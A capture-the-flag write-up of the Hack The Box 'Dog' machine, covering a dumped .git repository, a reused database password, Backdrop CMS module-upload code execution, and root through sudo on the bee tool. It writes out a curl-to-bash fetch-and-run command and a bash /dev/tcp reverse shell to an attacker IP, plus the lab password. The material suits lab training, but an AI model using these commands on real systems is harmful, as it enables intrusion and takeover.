# HTB DOG

## Linux - EASY

### Enumeration

Initial Nmap scan

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=
|   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Home | Dog
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-git:
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 22 disallowed entries
| /core/ /profiles/ /README.md /web.config /admin
| /comment/reply /filter/tips /node/add /search /user/register
| /user/password /user/login /user/logout /?q=admin /?q=comment/reply
| /?q=filter/tips /?q=node/add /?q=search /?q=user/password
|_/?q=user/register /?q=user/login /?q=user/logout
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The beauty of script and version scan is it gives something to start digging

There is a .git repository hosted on the website, lets dump the git repository using a tool - git-dumper

after downloading the files, we can check git logs to see what the author was up to - 

```
└──╼ $git log
commit 8204779c764abd4c9d8d95038b6d22b6a7515afa (HEAD -> master)
Author: root <dog@dog.htb>
Date:   Fri Feb 7 21:22:11 2025 +0000

    todo: customize url aliases.  reference:https://docs.backdropcms.org/documentation/url-aliases

```

lets add dog.htb to our hosts file

we also find a settings.php file with a possible password

```
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';
```

We also need a username, after searching the files from git-dumper, I thought of searching for dog.htb and found a username
```
└──╼ $grep -iR dog.htb
files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
.git/logs/HEAD:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000    commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
.git/logs/refs/heads/master:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000       commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
```

lets use tiffany@dog.htb as username and hope they've reused the password

### Initial Foothold

Lets try to login into the CMS using the username and password --- and we have login, checking for Backdrop CMS exploits we find a Authenticated RCE on exploit-db - 52021 which is for CMS version 1.21.1, lets see what version we are running

![image](https://github.com/user-attachments/assets/46c059d5-9cb0-46d2-8c4e-b3ec25a4cc90)

Lets download the script and see if we can get code execution.

The script runs successfully but on visiting the php file, we get a file not found 404, after examining the script, it uploads a zip to /admin/modules/install, after checking the webpage, we see zip support is disabled

![image](https://github.com/user-attachments/assets/3b86f5ad-4d75-4cff-986e-b6b5afb92872)

We need to find a workaround, lets try the Manual Install option on the bottom right and uploading a tar archive.

```
┌─[captainjack09☺htb-x1jwstjp1k]─[~/my_data/machines/dog]
└──╼ $ls
52021.py  creds.txt  nmap.txt  shell  shell.zip
┌─[captainjack09☺htb-x1jwstjp1k]─[~/my_data/machines/dog]
└──╼ $tar -cf shell.tar shell/*
┌─[captainjack09☺htb-x1jwstjp1k]─[~/my_data/machines/dog]
└──╼ $ls
52021.py  creds.txt  nmap.txt  shell  shell.tar  shell.zip
┌─[captainjack09☺htb-x1jwstjp1k]─[~/my_data/machines/dog]
└──╼ $tar -tvf shell.tar
-rw-r--r-- captainjack09/captainjack09 500 2025-05-11 05:52 shell/shell.info
-rw-r--r-- captainjack09/captainjack09 350 2025-05-11 05:52 shell/shell.php
```


![image](https://github.com/user-attachments/assets/ee0d37ad-eeba-4ddd-8d98-9d5ddc12cc0c)

![image](https://github.com/user-attachments/assets/69715318-49a5-45a2-a27c-f7516ed5d377)

AAAAAND we have code execution

![image](https://github.com/user-attachments/assets/96c0ebe2-076e-4cfc-99ea-b47fd3428ce3)

lets get a reverse shell and start enumerating

![image](https://github.com/user-attachments/assets/197a1373-25fc-4efa-9395-3763a49bafad)

The website hangs, which is a good sign and we get a reverse shell

![image](https://github.com/user-attachments/assets/0ee2ad05-5df9-43ed-ae98-6a4dea638efe)

After enumerating, I though to chcek the home directory and we see a user johncusack with user.txt file, lets try su johncusack and re-enter the admin password from the CMS

```
www-data@dog:/var/www$ ls -laR /home                                                                                                                                                                             /home:                                                                                                                                                                                                           total 16                                                                                                                                                                                                         drwxr-xr-x  4 root       root       4096 Aug 15  2024 .                                                                                                                                                          drwxr-xr-x 19 root       root       4096 Feb  7 18:31 ..                                                                                                                                                         drwxr-xr-x  4 jobert     jobert     4096 Feb  7 15:59 jobert                                                                                                                                                     drwxr-xr-x  3 johncusack johncusack 4096 Feb  7 15:59 johncusack                                                                                                                                                 
/home/jobert:
total 28
drwxr-xr-x 4 jobert jobert 4096 Feb  7 15:59 .
drwxr-xr-x 4 root   root   4096 Aug 15  2024 ..
lrwxrwxrwx 1 root   root      9 Feb  7 15:59 .bash_history -> /dev/null
-rw-r--r-- 1 jobert jobert  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 jobert jobert 3771 Feb 25  2020 .bashrc
drwx------ 2 jobert jobert 4096 Jul  8  2024 .cache
lrwxrwxrwx 1 root   root      9 Feb  7 15:59 .mysql_history -> /dev/null
-rw-r--r-- 1 jobert jobert  807 Feb 25  2020 .profile
drwx------ 2 jobert jobert 4096 Jul  8  2024 .ssh
-rw-r--r-- 1 jobert jobert    0 Jul  8  2024 .sudo_as_admin_successful
ls: cannot open directory '/home/jobert/.cache': Permission denied
ls: cannot open directory '/home/jobert/.ssh': Permission denied

/home/johncusack:
total 28
drwxr-xr-x 3 johncusack johncusack 4096 Feb  7 15:59 .
drwxr-xr-x 4 root       root       4096 Aug 15  2024 ..
lrwxrwxrwx 1 root       root          9 Feb  7 15:59 .bash_history -> /dev/null
-rw-r--r-- 1 johncusack johncusack  220 Aug 15  2024 .bash_logout
-rw-r--r-- 1 johncusack johncusack 3771 Aug 15  2024 .bashrc
drwx------ 2 johncusack johncusack 4096 Aug 16  2024 .cache
lrwxrwxrwx 1 root       root          9 Feb  7 15:59 .mysql_history -> /dev/null
-rw-r--r-- 1 johncusack johncusack  807 Aug 15  2024 .profile
-rw-r----- 1 root       johncusack   33 May  9 12:21 user.txt
ls: cannot open directory '/home/johncusack/.cache': Permission denied
```

Lets stabilize our shell

```
www-data@dog:/var/www/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@dog:/var/www/html$ ^Z
[1]+  Stopped                 ncat -lvnp 9001
┌─[✗]─[captainjack09☺htb-x1jwstjp1k]─[~/my_data/machines/dog/git/core]
└──╼ $stty raw -echo;fg
ncat -lvnp 9001
www-data@dog:/var/www/html$
www-data@dog:/var/www/html$ export TERM=xterm
```

Now we can run su

```
www-data@dog:/var/www$ su johncusack
Password:
johncusack@dog:/var/www$ id
uid=1001(johncusack) gid=1001(johncusack) groups=1001(johncusack)
```

Checking if the user can ssh

```
┌─[captainjack09☺htb-x1jwstjp1k]─[~/my_data/machines/dog]
└──╼ $nxc ssh dog.htb -u johncusack -p BackDropJ2024DS2024
SSH         10.10.11.58     22     dog.htb          [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.12
SSH         10.10.11.58     22     dog.htb          [+] johncusack:BackDropJ2024DS2024  Linux - Shell access!
```

Lets ssh into the box as ssh has a better and stable shell

### Privilege escalation

Basic enumeration

```
johncusack@dog:~$ sudo -l
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

checking bee help we see an interesting command

```
  eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.
```

Lets try to leverage this and get a reverse shell

```
$ sudo bee --root=/var/www/html php-eval "system('curl 10.10.14.7:8000/pwn | bash')"
```

Lets stand up a webserver and create a reverse shell pwn

```
┌─[captainjack09☺htb-x1jwstjp1k]─[~/my_data/machines/dog/www]
└──╼ $cat pwn
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.7/9001 0>&1
```

Lets catch this using netcat

PWNED

![image](https://github.com/user-attachments/assets/212b0ac8-e96a-4635-b08a-25ea02ead3a5)

Lets grab the root flag

REFERENCES
https://github.com/arthaud/git-dumper
https://www.exploit-db.com/exploits/52021
